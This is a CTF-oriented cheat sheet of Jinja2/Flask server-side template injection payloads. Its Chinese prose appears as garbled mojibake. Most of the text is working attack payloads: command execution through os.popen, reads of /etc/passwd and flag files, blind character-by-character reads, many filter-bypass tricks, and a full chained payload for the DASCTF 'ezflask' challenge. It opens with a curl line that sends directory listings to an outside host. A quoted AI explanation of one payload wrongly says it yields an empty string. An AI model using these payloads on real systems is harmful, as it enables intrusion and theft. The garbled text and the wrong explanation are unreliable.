if ''.__class__.__mro__[2].__subclasses__() [59].__init__.func_globals.linecache.os.popen('curl http://http.bin.buuoj.cn/1inhq4f1 -d `ls / | grep flag`;') %}1{% endif %} å¦‚æœä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œè¯»å–æ–‡ä»¶å¯ä»¥åˆ©ç”¨ç›²æ³¨çš„æ–¹æ³•é€ä½å°†å†…å®¹çˆ†å‡ºæ¥ {% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %}1{% endif %} è¿‡æ»¤å¼•å· request.args æ˜¯flaskä¸­çš„ä¸€ä¸ªå±æ€§,ä¸ºè¿”å›è¯·æ±‚çš„å‚æ•°,è¿™é‡ŒæŠŠ path å½“ä½œå˜é‡å,å°†åé¢çš„è·¯å¾„ä¼ å€¼è¿›æ¥,è¿›è€Œç»•è¿‡äº†å¼•å·çš„è¿‡æ»¤ {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40) (request.args.path).read()}}&amp;path=/etc/passw è¿‡æ»¤äº†å•åŒå¼•å·å’Œä¸­æ‹¬å· request.cookiesä»ç„¶å¯ä»¥ç”¨ å•åŒå¼•å·çš„ç»•è¿‡è¿˜æ˜¯åˆ©ç”¨ä¹‹å‰æåˆ°çš„å§¿åŠ¿ï¼Œè‡³äºä¸­æ‹¬å·çš„ç»•è¿‡æ‹¿ç‚¹ç»•è¿‡ï¼Œæ‹¿ getitem ç­‰ç»•è¿‡éƒ½å¯ ä»¥ã€‚ ä½¿ç”¨requestç»•è¿‡çš„è¯å¯ä»¥è¿™æ ·ï¼š ?name={{url_for.__globals__.os.popen(request.cookies.c).read()}} Cookie:c=cat /flag è¿‡æ»¤å…³é”®å­— base64ç¼–ç ç»•è¿‡ getattribute ä½¿ç”¨å®ä¾‹è®¿é—®å±æ€§æ—¶,è°ƒç”¨è¯¥æ–¹æ³• ä¾‹å¦‚è¢«è¿‡æ»¤æ‰ class å…³é”®è¯ {{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__() [40](\"/etc/passwd\").read()}} å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ {{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40] (\"/etc/passwd\").read()}} è¿‡æ»¤ _ åˆ©ç”¨request.argså±æ€§ {{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40] ('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ å°†å…¶ä¸­çš„request.argsæ”¹ä¸ºrequest.valuesåˆ™åˆ©ç”¨postçš„æ–¹å¼è¿›è¡Œä¼ å‚ è¿‡æ»¤os ?name= {{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c). read()}}&amp;a=__globals__&amp;b=os&amp;c=cat /flag è¿‡æ»¤args ?name={{url_for.__globals__[request.cookies.a][request.cookies.b] (request.cookies.c).read()}} cookieï¼ša=os;b=popen;c=cat /flag {{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}} cookie:a=__globals__;b=cat /flag å¼•å·å†…åå…­è¿›åˆ¶ç»•è¿‡ {{\"\".__class__}} {{\"\"[\"\\x5f\\x5fclass\\x5f\\x5f\" _`æ˜¯`\\x5f`ï¼Œ`.`æ˜¯`\\x2E \" â€™ chrç­‰è¢«è¿‡æ»¤ï¼Œæ— æ³•å¼•å…¥å­—ç¬¦ä¸² ç›´æ¥æ‹¼æ¥é”®å dict(buil=aa,tins=dd)|join() åˆ©ç”¨ string ã€ pop ã€ list ã€ slice ã€ first ç­‰è¿‡æ»¤å™¨ä»å·²æœ‰å˜é‡é‡Œé¢ç›´æ¥æ‰¾ (app.__doc__|list()).pop(102)|string() æ„é€ å‡º % å’Œ c åï¼Œç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»£æ›¿ chr {%set udl=dict(a=pc,c=c).values()|join %} # uld=%c {%set i1=dict(a=i1,c=udl%(99)).values()|join %} è¿‡æ»¤æ•°å­— ä¾‹å¦‚web370 å°±æƒ³åŠæ³•æ„é€ å‡ºæ•°å­— ?name= {% set c=(dict(e=a)|join|count)%} {% set cc=(dict(ee=a)|join|count)%} {% set ccc=(dict(eee=a)|join|count)%} {% set cccc=(dict(eeee=a)|join|count)%} {% set ccccccc=(dict(eeeeeee=a)|join|count)%} {% set cccccccc=(dict(eeeeeeee=a)|join|count)%} {% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%} {% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%} {% set coun=(cc~cccc)|int%} {% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(coun)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%} {% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%} {% set built=(a,a,dict(builtins=a)|join,a,a)|join()%} {% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%} {% set chr=x.chr%} {% set file=chr((cccc~ccccccc)|int)%2bchr((cccccccccc~cc)|int)%2bchr((cccccccccc~cccccc cc)|int)%2bchr((ccccccccc~ccccccc)|int)%2bchr((cccccccccc~ccc)|int)%} {%print(x.open(file).read())%} ä½¿ç”¨ Jinja2 è¿‡æ»¤å™¨ç»•è¿‡ åœ¨ JinJa2 ä¸­å†…ç½®äº†å¾ˆå¤šè¿‡æ»¤å™¨ï¼Œå˜é‡å¯ä»¥é€šè¿‡è¿‡æ»¤å™¨è¿›è¡Œä¿®æ”¹ï¼Œè¿‡æ»¤å™¨ä¸å˜é‡ä¹‹é—´ç”¨ç®¡é“ç¬¦å·|éš”å¼€ï¼Œæ‹¬å·ä¸­å¯ä»¥æœ‰å¯é€‰å‚æ•°ï¼Œä¹Ÿå¯ä»¥æ²¡æœ‰å‚æ•°ï¼Œè¿‡æ»¤å™¨å‡½æ•°å¯ä»¥å¸¦æ‹¬å·ä¹Ÿå¯ä»¥ä¸å¸¦æ‹¬å·ã€‚å¯ä»¥ä½¿ç”¨ç®¡é“ç¬¦å·|è¿æ¥å¤šä¸ªè¿‡æ»¤å™¨ï¼Œä¸€ä¸ªè¿‡æ»¤å™¨çš„è¾“å‡ºåº”ç”¨äºä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨ã€‚ å†…ç½®è¿‡æ»¤å™¨åˆ—è¡¨å¦‚ä¸‹ï¼š abs() forceescape() map() select() unique() attr() format() max() selectattr() upper() batch() groupby() min() slice() urlencode() capitalize() indent() pprint() sort() urlize() center() int() random() string() wordcount() default() items() reject() striptags() wordwrap() dictsort() join() rejectattr() sum() xmlattr() escape() last() replace() title() filesizeformat() length() reverse() tojson() first() list() round() trim() float() lower() safe() truncate() å…¶ä¸­å¸¸è§è¿‡æ»¤å™¨ç”¨æ³•å¦‚ä¸‹ï¼š abs() è¿”å›å‚æ•°çš„ç»å¯¹å€¼ã€‚ attr() è·å–å¯¹è±¡çš„å±æ€§ã€‚foo|attr(â€œbarâ€) ç­‰ä»·äº foo.bar capitalize() ç¬¬ä¸€ä¸ªå­—ç¬¦å¤§å†™ï¼Œæ‰€æœ‰å…¶ä»–å­—ç¬¦å°å†™ã€‚ first() è¿”å›åºåˆ—çš„ç¬¬ä¸€é¡¹ã€‚ float() å°†å€¼è½¬æ¢ä¸ºæµ®ç‚¹æ•°ã€‚å¦‚æœè½¬æ¢ä¸èµ·ä½œç”¨å°†è¿”å› 0.0ã€‚ int() å°†å€¼è½¬æ¢ä¸ºæ•´æ•°ã€‚å¦‚æœè½¬æ¢ä¸èµ·ä½œç”¨å°†è¿”å› 0ã€‚ items() è¿”å›ä¸€ä¸ªè¿­ä»£å™¨(key, value)æ˜ å°„é¡¹ã€‚ å…¶ä»–ç”¨æ³•è¯¦è§å®˜æ–¹æ–‡æ¡£ï¼š Template Designer Documentation - Jinja Documentation (3.2.x) ä½¿ç”¨è¿‡æ»¤å™¨æ„é€ Payloadï¼Œä¸€èˆ¬æ€è·¯æ˜¯åˆ©ç”¨è¿™äº›è¿‡æ»¤å™¨ï¼Œé€æ­¥æ‹¼æ¥å‡ºéœ€è¦çš„å­—ç¬¦ã€æ•°å­—æˆ–å­—ç¬¦ä¸²ã€‚å¯¹äºä¸€èˆ¬åŸå§‹å­—ç¬¦çš„è·å–æ–¹æ³•æœ‰ä»¥ä¸‹å‡ ç§ï¼š {% set org = ({ }|select()|string()) %}{{org}} # &lt;generator object select_or_reject at 0x0000020B2CA4EA20&gt; {% set org = (self|string()) %}{{org}} # &lt;TemplateReference None&gt; {% set org = self|string|urlencode %}{{org}} # %3CTemplateReference%20None%3E {% set org = (app.__doc__|string) %}{{org}} # Hello The default undefined type. This undefined type can be printed and # iterated over, but every other access will raise an :exc:`UndefinedError`: # # &gt;&gt;&gt; foo = Undefined(name='foo') # &gt;&gt;&gt; str(foo) # '' # &gt;&gt;&gt; not foo # True # &gt;&gt;&gt; foo + 42 # Traceback (most recent call last): # ... # jinja2.exceptions.UndefinedError: 'foo' is undefined {% set num = (self|int) %}{{num}} # 0 {% set num = (self|string|length) %}{{num}} # 24 {% set point = self|float|string|min %}{{point}} # . é€šè¿‡ä»¥ä¸Šå‡ ç§Payloadï¼Œè¿”å›çš„å­—ç¬¦ä¸²ä¸­åŒ…å«å°–æ‹¬å·ã€å­—æ¯ã€ç©ºæ ¼ã€ä¸‹åˆ’çº¿ã€æ•°å­—ã€ç©ºæ ¼ã€ç™¾åˆ†å·ã€ç‚¹å·ã€‚ æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯ä½¿ç”¨è¿™äº›è¿”å›çš„å­—ç¬¦ä¸²ï¼Œç»“åˆå„ç§è¿‡æ»¤å™¨ï¼Œæ‹¼æ¥å‡ºæœ€ç»ˆçš„Payloadã€‚ GPTä»£ç è§£é‡Š è¿™æ®µä»£ç æ˜¯ä½¿ç”¨Jinja2æ¨¡æ¿è¯­è¨€çš„è¯­æ³•ã€‚è®©æˆ‘é€æ­¥è§£é‡Šå®ƒçš„å«ä¹‰ï¼š 1. `{% set org = ... %}`: è¿™æ˜¯Jinja2çš„èµ‹å€¼è¯­å¥ã€‚å®ƒåˆ›å»ºäº†ä¸€ä¸ªåä¸º\"org\"çš„å˜é‡ï¼Œå¹¶å°†å…¶èµ‹å€¼ä¸ºæ¥ä¸‹æ¥è¡¨è¾¾å¼çš„ç»“æœã€‚ 2. `({ }|select()|string())`: è¿™æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œç”±å‡ ä¸ªæ“ä½œç¬¦ç»„æˆã€‚ - `{ }`ï¼šè¿™æ˜¯ä¸€ä¸ªç©ºçš„å­—å…¸å¯¹è±¡ã€‚ - `select()`ï¼šè¿™æ˜¯Jinja2çš„è¿‡æ»¤å™¨(filter)å‡½æ•°ä¹‹ä¸€ã€‚`select()`å‡½æ•°ç”¨äºé€‰æ‹©å­—å…¸ä¸­çš„é¡¹ï¼Œä½†åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå­—å…¸æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥å®ƒå®é™…ä¸Šæ²¡æœ‰è¿›è¡Œä»»ä½•é€‰æ‹©ã€‚ - `string()`ï¼šè¿™æ˜¯Jinja2çš„è¿‡æ»¤å™¨å‡½æ•°ä¹‹ä¸€ã€‚`string()`å‡½æ•°å°†å…¶è¾“å…¥è½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹ã€‚ 3. `{{org}}`: è¿™æ˜¯Jinja2çš„è¾“å‡ºè¡¨è¾¾å¼ã€‚å®ƒä¼šåœ¨æ¨¡æ¿ä¸­æ˜¾ç¤ºå˜é‡\"org\"çš„å€¼ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œè¿™æ®µä»£ç çš„ä½œç”¨æ˜¯åˆ›å»ºä¸€ä¸ªåä¸º\"org\"çš„å˜é‡ï¼Œå¹¶å°†å…¶èµ‹å€¼ä¸ºç©ºå­—å…¸ç»è¿‡é€‰æ‹©å’Œå­—ç¬¦ä¸²è½¬æ¢åçš„ç»“æœã€‚ç„¶åï¼Œå®ƒå°†\"org\"çš„å€¼è¾“å‡ºåˆ°æ¨¡æ¿ä¸­ã€‚ç”±äºé€‰æ‹©å’Œå­—ç¬¦ä¸²è½¬æ¢æ“ä½œå¹¶æœªæ”¹å˜ç©ºå­—å…¸çš„å†…å®¹ï¼Œå› æ­¤æœ€ç»ˆè¾“å‡ºçš„ç»“æœå°†æ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚ å®æˆ˜æ¼”ç¤º [2020 DASCTF å…«æœˆå®‰æ’æœˆèµ›]ezflask é¢˜ç›®æºç ï¼š #!/usr/bin/env python # -*- coding: utf-8 -*- from flask import Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directory app = Flask(__name__) @app.route(\"/\") def index(): def safe_jinja(s): blacklist = ['class', 'attr', 'mro', 'base', 'request', 'session', '+', 'add', 'chr', 'ord', 'redirect', 'url_for', 'config', 'builtins', 'get_flashed_messages', 'get', 'subclasses', 'form', 'cookies', 'headers', '[', ']', '\\'', '\"', '{}'] flag = True for no in blacklist: if no.lower() in s.lower(): flag = False break return flag if not request.args.get('name'): return open(__file__).read() elif safe_jinja(request.args.get('name')): name = request.args.get('name') else: name = 'wendell' template = ''' &lt;div class=\"center-content\"&gt; &lt;p&gt;Hello, %s&lt;/p&gt; &lt;/div&gt; &lt;!--flag in /flag--&gt; &lt;!--python3.8--&gt; ''' % (name) return render_template_string(template) if __name__ == \"__main__\": app.run(host='0.0.0.0', port=5000) å¯ä»¥çœ‹åˆ°é¢˜ç›®è¿‡æ»¤çš„æ­»æ­»åœ°ï¼Œæœ€å…³é”®æ˜¯æŠŠatträ¹Ÿç»™è¿‡æ»¤äº†çš„è¯ï¼Œè¿™å°±å¾ˆéº»çƒ¦äº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥ç”¨è¿‡æ»¤å™¨è¿›è¡Œç»•è¿‡ã€‚ åœ¨å­˜åœ¨sstiçš„åœ°æ–¹æ‰§è¡Œå¦‚ä¸‹payloadï¼š {% set org = ({ }|select()|string()) %}{{org}} # æˆ– {% set org = ({ }|select|string) %}{{org}} å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€æ®µå­—ç¬¦ä¸²ï¼š&lt;generator object select_or_reject at 0x7f06771f4150&gt;ï¼Œè¿™æ®µå­—ç¬¦ä¸²ä¸­ä¸ä»…å­˜åœ¨å­—ç¬¦ï¼Œè¿˜å­˜åœ¨ç©ºæ ¼ã€ä¸‹åˆ’çº¿ï¼Œå°–å·å’Œæ•°å­—ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœé¢˜ç›®è¿‡æ»¤äº†è¿™äº›å­—ç¬¦çš„è¯ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥åœ¨ &lt;generator object select_or_reject at 0x7f06771f4150&gt; è¿™ä¸ªå­—ç¬¦ä¸²ä¸­å–åˆ°æˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦ï¼Œä»è€Œç»•è¿‡è¿‡æ»¤ã€‚ ç„¶åæˆ‘ä»¬åœ¨ä½¿ç”¨list()è¿‡æ»¤å™¨å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºåˆ—è¡¨ï¼š {% set orglst = ({ }|select|string|list) %}{{orglst}} å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œåå›äº†ä¸€ä¸ªåˆ—è¡¨ï¼Œåˆ—è¡¨ä¸­æ˜¯ &lt;generator object select_or_reject at 0x7f06771f4150&gt; è¿™ä¸ªå­—ç¬¦ä¸²çš„æ¯ä¸€ä¸ªå­—ç¬¦ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ä¾¿å¯ä»¥ä½¿ç”¨ä½¿ç”¨pop()ç­‰æ–¹æ³•å°†åˆ—è¡¨é‡Œçš„å­—ç¬¦å–å‡ºæ¥äº†ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œæˆ‘ä»¬å–ä¸€ä¸ªä¸‹åˆ’çº¿ _ï¼š {% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}} # _ åŒç†è¿˜èƒ½å–åˆ°æ›´å¤šçš„å­—ç¬¦ï¼š {% set space = (({ }|select|string|list).pop(10)|string) %}{{spa}} # ç©ºæ ¼ {% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}} # _ {% set zero = (({ }|select|string|list).pop(38)|int) %}{{zero}} # 0 {% set seven = (({ }|select|string|list).pop(40)|int) %}{{seven}} # 7 ...... è¿™é‡Œï¼Œå…¶å®æœ‰äº†æ•°å­—0ä¹‹åï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ä¾æ¬¡å°†å…¶ä½™çš„æ•°å­—å…¨éƒ¨æ„é€ å‡ºæ¥ï¼ŒåŸç†å°±æ˜¯åŠ å‡ä¹˜é™¤ã€å¹³æ–¹ç­‰æ•°å­¦è¿ç®—ï¼Œå¦‚ä¸‹ç¤ºä¾‹ï¼š {% set zero = (({ }|select|string|list).pop(38)|int) %} # 0 {% set one = (zero**zero)|int %}{{one}} # 1 {%set two = (zero-one-one)|abs %} # 2 {%set three = (zero-one-one-one)|abs %} # 3 {% set five = (two*two*two)-one-one-one %} # 5 # {%set four = (one+three) %} æ³¨æ„, è¿™æ ·çš„åŠ å·çš„æ˜¯ä¸è¡Œçš„,ä¸çŸ¥é“ä¸ºä»€ä¹ˆ,åªèƒ½ç”¨å‡å·é…åˆabså–ç»å¯¹å€¼äº† ...... é€šè¿‡ä¸Šè¿°åŸç†ï¼Œæˆ‘ä»¬å¯ä»¥ä¾æ¬¡è·å¾—æ„é€ payloadæ‰€éœ€çš„ç‰¹æ®Šå­—ç¬¦ä¸å­—ç¬¦ä¸²ï¼š # é¦–å…ˆæ„é€ å‡ºæ‰€éœ€çš„æ•°å­—: {% set zero = (({ }|select|string|list).pop(38)|int) %} # 0 {% set one = (zero**zero)|int %} # 1 {% set two = (zero-one-one)|abs %} # 2 {% set four = (two*two)|int %} # 4 {% set five = (two*two*two)-one-one-one %} # 5 {% set seven = (zero-one-one-five)|abs %} # 7 # æ„é€ å‡ºæ‰€éœ€çš„å„ç§å­—ç¬¦ä¸å­—ç¬¦ä¸²: {% set xhx = (({ }|select|string|list).pop(24)|string) %} # _ {% set space = (({ }|select|string|list).pop(10)|string) %} # ç©ºæ ¼ {% set point = ((app.__doc__|string|list).pop(26)|string) %} # . {% set yin = ((app.__doc__|string|list).pop(195)|string) %} # å•å¼•å· ' {% set left = ((app.__doc__|string|list).pop(189)|string) %} # å·¦æ‹¬å· ( {% set right = ((app.__doc__|string|list).pop(200)|string) %} # å³æ‹¬å· ) {% set c = dict(c=aa)|reverse|first %} # å­—ç¬¦ c {% set bfh = self|string|urlencode|first %} # ç™¾åˆ†å· % {% set bfhc=bfh~c %} # è¿™é‡Œæ„é€ äº†%c, ä¹‹åå¯ä»¥åˆ©ç”¨è¿™ä¸ª%cæ„é€ ä»»æ„å­—ç¬¦ã€‚~ç”¨äºå­—ç¬¦è¿æ¥ {% set slas = bfhc%((four~seven)|int) %} # ä½¿ç”¨%cæ„é€ æ–œæ  / {% set but = dict(buil=aa,tins=dd)|join %} # builtins {% set imp = dict(imp=aa,ort=dd)|join %} # import {% set pon = dict(po=aa,pen=dd)|join %} # popen {% set os = dict(o=aa,s=dd)|join %} # os {% set ca = dict(ca=aa,t=dd)|join %} # cat {% set flg = dict(fl=aa,ag=dd)|join %} # flag {% set ev = dict(ev=aa,al=dd)|join %} # eval {% set red = dict(re=aa,ad=dd)|join %} # read {% set bul = xhx*2~but~xhx*2 %} # __builtins__ å°†ä¸Šé¢æ„é€ çš„å­—ç¬¦æˆ–å­—ç¬¦ä¸²æ‹¼æ¥èµ·æ¥æ„é€ å‡º __import__('os').popen('cat /flag').read()ï¼š {% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %} å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒæˆåŠŸæ„é€ å‡ºäº† __import__('os').popen('cat /flag').read() ã€‚ ç„¶åå°†ä¸Šé¢æ„é€ çš„å„ç§å˜é‡æ·»åŠ åˆ°SSTIä¸‡èƒ½payloadé‡Œé¢å°±è¡Œäº†ï¼š {% for f,v in whoami.__init__.__globals__.items() %} # globals {% if f == bul %} {% for a,b in v.items() %} # builtins {% if a == ev %} # eval {{b(pld)}} # eval(\"__import__('os').popen('cat /flag').read()\") {% endif %} {% endfor %} {% endif %} {% endfor %} æ‰€ä»¥æœ€ç»ˆçš„payloadä¸ºï¼š {% set zero = (({ }|select|string|list).pop(38)|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs|int %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set seven = (zero-one-one-five)|abs %}{% set xhx = (({ }|select|string|list).pop(24)|string) %}{% set space = (({ }|select|string|list).pop(10)|string) %}{% set point = ((app.__doc__|string|list).pop(26)|string) %}{% set yin = ((app.__doc__|string|list).pop(195)|string) %}{% set left = ((app.__doc__|string|list).pop(189)|string) %}{% set right = ((app.__doc__|string|list).pop(200)|string) %}{% set c = dict(c=aa)|reverse|first %}{% set bfh=self|string|urlencode|first %}{% set bfhc=bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set os = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx*2~but~xhx*2 %}{% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in whoami.__init__.__globals__.items() %}{% if f == bul %}{% for a,b in v.items() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %} å‚è€ƒï¼šhttps://xz.aliyun.com/t/9584 2.6 ä¸€äº›å§¿åŠ¿ 1. config {{config}} å¯ä»¥è·å–å½“å‰è®¾ç½®ï¼Œå¦‚æœé¢˜ç›®ç±»ä¼¼ app.config ['FLAG'] = os.environ.popï¼ˆ'FLAG'ï¼‰ ï¼Œé‚£å¯ä»¥ç›´æ¥è®¿é—® {{config['FLAG']}} æˆ–è€… {{config.FLAG}} å¾—åˆ°flag 2. self {{self}} â‡’ &lt;TemplateReference None&gt; {{self.__dict__._TemplateReference__context.config}} â‡’ åŒæ ·å¯ä»¥æ‰¾åˆ°config 3. â€œâ€ ã€ [] ã€ () ç­‰æ•°æ®ç»“æ„ ä¸»è¦ç›®çš„æ˜¯é…åˆ __class__.__mro__[2] è¿™æ ·æ‰¾åˆ° object ç±» {{[].__class__.__base__.__subclasses__() [68].__init__.__globals__['os'].__dict__.environ['FLAG'] 4ã€url_for, g, request, namespace, lipsum, range, session, dict,get_flashed_messages, cycler, joiner, configç­‰ å¦‚æœconfigï¼Œselfä¸èƒ½ä½¿ç”¨ï¼Œè¦è·å–é…ç½®ä¿¡æ¯ï¼Œå°±å¿…é¡»ä»å®ƒçš„ä¸Šéƒ¨å…¨å±€å˜é‡ï¼ˆè®¿é—®é…ç½®current_app ç­‰ï¼‰ã€‚ ä¾‹å¦‚ï¼š {{url_for.__globals__['current_app'].config.FLAG}} {{get_flashed_messages.__globals__['current_app'].config.FLAG}} {{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncode r.default.__globals__['current_app'].config['FLAG']}} 5. åœ¨URLæ‰§è¡Œpyå‘½ä»¤æ ¼å¼ {%è¿™æ˜¯å†…å®¹%} eg: {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__=='file' %} {{ c(\"/etc/passwd\").readlines() }} {% endif %} {% endfor %} 2.7 å¸¸ç”¨åˆ°çš„payload name={{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}} //132æ˜¯osæ¨¡å— name={{ config.__class__.__init__.__globals__['os'].popen('cat ../flag').read() }} //å¤§ä½¬ç»å¸¸ç”¨çš„configç›´æ¥å‡º åœ¨å¯¼å…¥ä¸äº†å…·ä½“å“ªä¸ªå­ç±»ä¾‹å¦‚132çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨__bulit__é‡æ–°å¯¼å…¥Osæ¨¡å—ç„¶åè¿›è¡Œå‘½ä»¤æ‰§è¡Œ name={{x.__init__.__globals__['__builtins__'].eval('__import__(\"os\").popen(\"cat /flag\").read()')}} å½“ç„¶å¦‚æœé‡åˆ°è¿‡äº†äº†æ•æ„Ÿå­—ç¬¦ï¼Œè®°å¾—è‡ªå·±å»æ‹¼æ¥ä¸€ä¸‹ æ³¨å…¥é¡ºåºï¼šå…ˆæ‰¾åˆ°ä¸€ä¸ªç±»å‹æ‰€å±çš„å¯¹è±¡â€“&gt;åœ¨æ‰¾åˆ°è¿™ä¸ªå¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»â€“&gt;ä»–çš„åŠŸèƒ½æ˜¯è°ä¼ æˆç»™ä»–çš„(â€˜æ‰¾åˆ°ä»–çˆ¶äº²â€™)â€“&gt;ä»–çˆ¶äº²é™¤äº†æœ‰è¿™ä¸ªå­ç±»ï¼Œè¿˜æœ‰å…¶ä»–çš„å­ç±»å‘—ï¼Œè¿™é‡Œçš„ç±»ï¼Œå°±åŒ…æ‹¬å¾ˆå¤šçš„æ–¹æ³•äº†ï¼Œæ¯”å¦‚æˆ‘ä»¬æœ€éœ€è¦ç”¨åˆ°çš„å°±æ˜¯ï¼ŒOSæ¨¡å—æ¥å‘½ä»¤æ‰§è¡Œâ€“&gt;æ‰¾åˆ°OSç±»äº†ï¼Œå°†è¿™ä¸ªç±»åˆå§‹åŒ–æˆæ–¹æ³•ï¼Œç›¸å½“äºæˆ‘ä»¬è°ƒç”¨äº†OSæ¨¡å—â€“&gt;é€šè¿‡globalsä¿å­˜å¯¹å…¨å±€å˜é‡çš„å¼•ç”¨ï¼Œç„¶åå†ç”¨OSæ¨¡å—è¿›è¡Œå‘½ä»¤æ‰§è¡Œ SSTIå¸¸ç”¨çš„è¯­å¥æ ¼å¼ {{5*5}} ç›´æ¥æ‰§è¡Œ {% set a=\"test\" %}{{a}} //è®¾ç½®å˜é‡ {% for i in ['t ','e ','s ','t '] %}{{i}}{%endfor%} //æ‰§è¡Œå¾ªç¯ --&gt;åˆ«å¿˜äº†ä¸­é—´é‚£ä¸ª{{i}} {% if 25==5*5 %}{{\"success\"}}{% endif %} //æ¡ä»¶æ‰§è¡Œ ç»•è¿‡SSTIè¿‡æ»¤ å†è¯»äº†ä¸€éƒ¨åˆ†çš„æ–‡ç« ï¼Œå†ç»“åˆè‡ªå·±çš„åšé¢˜æƒ…å†µæ¥çœ‹ï¼Œå¯¹SSTIè€ƒç‚¹æ€»ç»“å¦‚ä¸‹ï¼š 1.è¿‡æ»¤ä¸€äº›å­—ç¬¦â€“&gt;ç»•è¿‡å³å¯ 2.å¯»æ‰¾æ¨¡å—è¿›è¡Œå‘½ä»¤æ‰§è¡Œ ä¸»è¦æ˜¯å¯¹ç¬¬ä¸€ä¸ªè¿‡æ»¤çš„è€ƒå¯Ÿï¼Œæ¯”å¦‚è¯´ï¼šå¯¹å­—ç¬¦ä¸²è¿›è¡Œæ‹¼æ¥ç»•è¿‡ï¼Œç¼–ç ç»•è¿‡ï¼Œformatã€charç­‰ç»•è¿‡æ‹¼æ¥ï¼Œé€šè¿‡getattributeç­‰å‡½æ•°æ›¿ä»£ç¬¦å·çš„æ•ˆæœ,é€šè¿‡requestçš„æ–¹æ³•è¿›è¡Œä¼ å‚ï¼Œé€šè¿‡%setçš„æ–¹æ³• æˆ‘ä»¬çŸ¥é“åœ¨SSTIä¸­ç”¨åˆ°çš„ç¬¦å·æ— éå°±æ˜¯ï¼š . __ () [] â€˜â€™ äº”ç§ ç¬¦å·çš„è¿‡æ»¤ è®¿é—®å˜é‡å±æ€§ï¼š . [] getattribute æ ‡å‡†çš„pythonè¯­æ³•ä½¿ç”¨ç‚¹ï¼ˆ.ï¼‰å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ä¸­æ‹¬å·ï¼ˆ[]ï¼‰æ¥è®¿é—®å˜é‡çš„å±æ€§,ä¹Ÿå¯ä»¥ä½¿ç”¨attræ¥è®¿é—®å˜é‡çš„å±æ€§ã€‚ è¿‡æ»¤äº†ç‚¹å· {{().__class__ }}ç­‰åŒäº{{()['__class__']}} \"\"|attr(\"__class__\") ç›¸å½“äº \"\".__class__ è¿‡æ»¤äº†ä¸­æ‹¬å· è¿˜æœ‰ä¸€äº›å…¶ä»–çš„è®¿é—®æ–¹æ³•ï¼špop get getitem: {{url_for.__globals__['__builtins__']}} {{url_for.__globals__.__getitem__('__builtins__')}} {{url_for.__globals__.pop('__builtins__')}} {{url_for.__globals__.get('__builtins__')}} {{url_for.__globals__.setdefault('__builtins__')}} {{\"\".class}}=={{\"\"[[cla,ss]|join]}} //è¿™æ˜¯æ‹¼æ¥ç»•è¿‡ \"__cladd__\"|replace(\"dd\",\"ss\") // \"__class__\" //è¿™æ˜¯æ›¿ä»£ â€œssalcâ€[::-1] \"\"[\"__ssalc__\"][::-1] \"\".__getattribute__(\"__ssalc__\"[::-1]) //è¿™æ˜¯åè½¬ \"\"[\"__CLASS__\".lower()] //è¿™æ˜¯å¤§å°å†™è½¬æ¢ 